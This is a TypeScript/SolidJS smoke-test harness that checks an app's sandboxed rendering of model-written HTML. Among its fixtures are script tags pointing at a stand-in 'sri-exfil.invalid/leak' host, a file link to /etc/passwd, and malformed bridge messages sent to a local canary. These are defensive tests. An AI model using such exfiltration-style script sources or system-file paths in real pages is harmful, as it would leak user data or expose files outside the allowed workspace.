import { EmptyArt } from './components/EmptyArt';
import type { EmptyScene } from './emptyScene';
import { createSignal, onCleanup, onMount } from 'solid-js';
import { ConfirmDialog } from './components/ConfirmDialog';
import { ARTIFACT_STYLES, HtmlArtifact, type AskBridge } from './components/HtmlArtifact';
import { HtmlDoc } from './components/HtmlDoc';
import { fileMode } from './canvas/canvasGrants';
import { KIT_SCRIPT_HASH, SANDBOX, SANDBOX_RUNTIME_HASH, sandboxDocParts, sealDoc, watchFrameTheme } from './components/htmlSandbox';
import { acceptFrameMessage } from './canvasBridge';
import { CANVAS_KIT } from './canvas/kitAssets';
import { CANVAS_KIT_ASK } from './canvas/kitAskAssets';
import { KIT_DISPLAY_FIXTURE, KIT_FIXTURE } from './canvas/kit/fixture';
import KIT_GALLERY from './canvas/kit/gallery.html?raw';
import KIT_ASK_GALLERY from './canvas/kit/ask/gallery.html?raw';

/** Model-written HTML often centres a column and colours its own body. That
 *  colour must still fill the whole frame (CSS propagates a body background
 *  to the viewport only while <html> has none), so ARTIFACT_STYLES paints its
 *  default on body, never on html. */
const OWN_BACKGROUND = `<style>body{background:#123456;color:#fff;margin:0 auto;max-width:200px}</style>
<p>A centred column on its own dark background.</p>`;
const PLAIN = '<p>An artifact with no background of its own.</p>';

/** `hc-file` links a chat or curated canvas opens through the host (bridge
 *  `navigate` → the side panel's Files view): one in the workspace, one
 *  outside the vault. The harness records what would open. */
const FILE_LINKS = `<p><hc-file path="outputs/report.md">Report</hc-file>
<hc-file path="/etc/passwd">Outside</hc-file></p>`;
const openedFiles: string[] = [];
(window as unknown as { openedFiles: string[] }).openedFiles = openedFiles;

const ARTIFACT = `
<main style="font-family:var(--app-display);display:grid;gap:12px">
  <h1 style="margin:0;font-size:22px">Artifact safety fixture</h1>
  <p>This fixture should render in Offline mode with scripts and network blocked.</p>
  <button onclick="document.body.dataset.clicked='1'">inline script button</button>
  <button onclick="parent.postMessage({__hc:1,kind:'open',href:'http://127.0.0.1:49231/canary?value=synthetic'},'*')">Request synthetic link</button>
  <button onclick="[{__hc:1,kind:'open',href:'http://127.0.0.1:49231/oversize?pad='+'a'.repeat(70000)},{__hc:2,kind:'open',href:'http://127.0.0.1:49231/version'},{__jbDoc:1,kind:'open',href:'http://127.0.0.1:49231/legacy'},{__hc:1,kind:'open',href:'http://127.0.0.1:49231/extra',extra:1},{__hc:1,kind:'draft',canvasId:'x',answers:{},summary:'x'}].forEach(m=>parent.postMessage(m,'*'));parent.postMessage({__hc:1,kind:'open',href:'http://127.0.0.1:49231/valid'},'*')">Send malformed bridge messages</button>
  <script>document.body.dataset.scriptRan = '1';</script>
</main>`;

/** SRI repair (2026-10-05): agent HTML that loads external scripts whose
 *  integrity is the public runtime and kit hash. Under a hash-source policy a
 *  browser requests them (the integrity check fails only afterwards); under
 *  the per-document nonce it must not. `#sri-end` follows the scripts, so once
 *  it is in the DOM the parser has passed them. */
const SRI_EXFIL = `<p>SRI exfil fixture</p>
<script src="https://sri-exfil.invalid/leak?script=runtime&amp;data=synthetic" integrity="${SANDBOX_RUNTIME_HASH.slice(1, -1)}"></script>
<script src="https://sri-exfil.invalid/leak?script=kit&amp;data=synthetic" integrity="${KIT_SCRIPT_HASH.slice(1, -1)}"></script>
<p id="sri-end">after the scripts</p>`;

/** The ask gallery's Send (question cards, 2026-10-14): what Hollow would
 *  send, kept for the smoke spec. */
const SMOKE_ASK: AskBridge = {
  answered: () => null,
  refusal: () => null,
  send: async (d) => {
    const w = window as unknown as { __askSent?: unknown[] };
    (w.__askSent ??= []).push(d);
    return null;
  },
  label: 'Send answers',
};

/** The gallery as a document that has the kit stylesheet and the host
 *  runtime (so it still follows the theme) but no kit script: what a canvas
 *  looks like before upgrade, or wherever the kit script doesn't run. `ask`:
 *  the ask kit's stylesheet too, without its script (Canvas C4). */
function KitFallbackFrame(props: { code: string; ask?: boolean; title?: string }) {
  let frame: HTMLIFrameElement | undefined;
  let stopTheme: (() => void) | undefined;
  const [height, setHeight] = createSignal(240);
  const doc = sealDoc(sandboxDocParts(ARTIFACT_STYLES, 'offline', { ...CANVAS_KIT, js: '' }, `\n${props.code}\n`,
    props.ask ? { ...CANVAS_KIT_ASK, js: '' } : undefined));
  const onMsg = (e: MessageEvent) => {
    const r = acceptFrameMessage(e, frame);
    if (r.ok && r.message.kind === 'size') setHeight(Math.max(40, Math.min(r.message.h, 4000)));
  };
  onMount(() => window.addEventListener('message', onMsg));
  onCleanup(() => { window.removeEventListener('message', onMsg); stopTheme?.(); });
  return (
    <iframe
      ref={el => { frame = el; stopTheme = watchFrameTheme(el); }}
      class="chat-artifact-frame"
      sandbox={SANDBOX}
      srcdoc={doc}
      style={{ height: `${height()}px` }}
      title={props.title ?? 'Kit gallery without the kit script'}
    />
  );
}

/** Light/Dark for a person looking at the gallery; the theme watcher restyles
 *  every mounted frame in place. Tests set the theme the same way. */
function ThemeSwitch() {
  const [theme, setTheme] = createSignal(document.documentElement.dataset.theme === 'dark' ? 'dark' : 'light');
  const pick = (t: 'light' | 'dark') => { document.documentElement.dataset.theme = t; setTheme(t); };
  return (
    <div role="group" aria-label="Gallery theme">
      <button type="button" aria-pressed={theme() === 'light'} onClick={() => pick('light')}>Light</button>
      <button type="button" aria-pressed={theme() === 'dark'} onClick={() => pick('dark')}>Dark</button>
    </div>
  );
}

/** 10-11 B1 review: one HtmlDoc kept mounted while its file changes, as the
 *  preview pane does. A grant on the first file must not reach the second. */
function SwitchingDoc() {
  const [second, setSecond] = createSignal(false);
  const path = () => (second() ? '/Users/me/Downloads/page.html' : '/v/workspaces/w1/sources/report.html');
  return <>
    <button type="button" onClick={() => setSecond(true)}>Show the other file</button>
    <HtmlDoc code={second() ? ARTIFACT.replace('safety fixture', 'second file') : ARTIFACT} defaultMode={fileMode(path(), false)} grantKey={`file:${path()}`} />
  </>;
}

export function SmokeHarness() {
  if (new URLSearchParams(location.search).has('empty-art')) return <main class="page-body"><h1>Quiet places to begin</h1><div class="empty-art-study">{(['inbox','commitments','results','sources','mission','search','waiting','tasks','automations'] as EmptyScene[]).map(kind => <section aria-label={kind}><EmptyArt kind={kind} evidence={{ready:true}}/><h2>{kind}</h2></section>)}</div></main>;
  return (
    <main class="page-body smoke-harness">
      <ConfirmDialog />
      <section class="panel">
        <h1>Smoke harness</h1>
        <HtmlArtifact code={ARTIFACT} lang="html" />
      </section>
      <section class="panel">
        <HtmlDoc code={ARTIFACT} />
      </section>
      <section class="panel" aria-label="Switching file">
        <SwitchingDoc />
      </section>
      <section class="panel" aria-label="Canvas kit fixture">
        <HtmlArtifact code={KIT_FIXTURE} lang="html" />
      </section>
      <section class="panel" aria-label="Canvas kit display fixture">
        <HtmlArtifact code={KIT_DISPLAY_FIXTURE} lang="html" />
      </section>
      <section class="panel" aria-label="Canvas file links">
        <HtmlArtifact code={FILE_LINKS} lang="html" fileBase={() => '/tmp/hollow/vault/workspaces/w1'} onFile={p => openedFiles.push(p)} />
      </section>
      <section class="panel" aria-label="Canvas kit gallery">
        <h2>Kit gallery</h2>
        <ThemeSwitch />
        <HtmlArtifact code={KIT_GALLERY} lang="html" />
      </section>
      <section class="panel" aria-label="Canvas kit gallery without the kit script">
        <h2>Kit gallery without the kit script</h2>
        <KitFallbackFrame code={KIT_GALLERY} />
      </section>
      {/* Canvas C4 A1: the ask kit's inputs in an ask-canvas frame. The bridge
          names a canvas so Hollow's Send has an id to collect for; the
          harness has no conversation, so each sent draft is kept on
          `window.__askSent` instead (a chat sends it, question cards
          2026-10-14). */}
      <section class="panel" aria-label="Canvas ask gallery">
        <h2>Ask gallery</h2>
        <ThemeSwitch />
        <HtmlArtifact code={KIT_ASK_GALLERY} lang="html" ask bridge={{ canvasId: 'kit-ask-gallery', state: () => null, ask: SMOKE_ASK }} />
      </section>
      <section class="panel" aria-label="Canvas ask gallery, not a saved canvas">
        <h2>Ask gallery, not a saved canvas</h2>
        <HtmlArtifact code={KIT_ASK_GALLERY} lang="html" ask />
      </section>
      <section class="panel" aria-label="Canvas ask gallery without the kit script">
        <h2>Ask gallery without the kit script</h2>
        <KitFallbackFrame code={KIT_ASK_GALLERY} ask title="Ask gallery without the kit script" />
      </section>
      <section class="panel" aria-label="SRI exfil fixture">
        <h2>SRI exfil fixture</h2>
        <HtmlArtifact code={SRI_EXFIL} lang="html" />
        <HtmlDoc code={SRI_EXFIL} />
      </section>
      <section class="panel" aria-label="Artifact backgrounds">
        <h2>Artifact backgrounds</h2>
        <HtmlArtifact code={OWN_BACKGROUND} lang="html" />
        <HtmlArtifact code={PLAIN} lang="html" />
      </section>
    </main>
  );
}
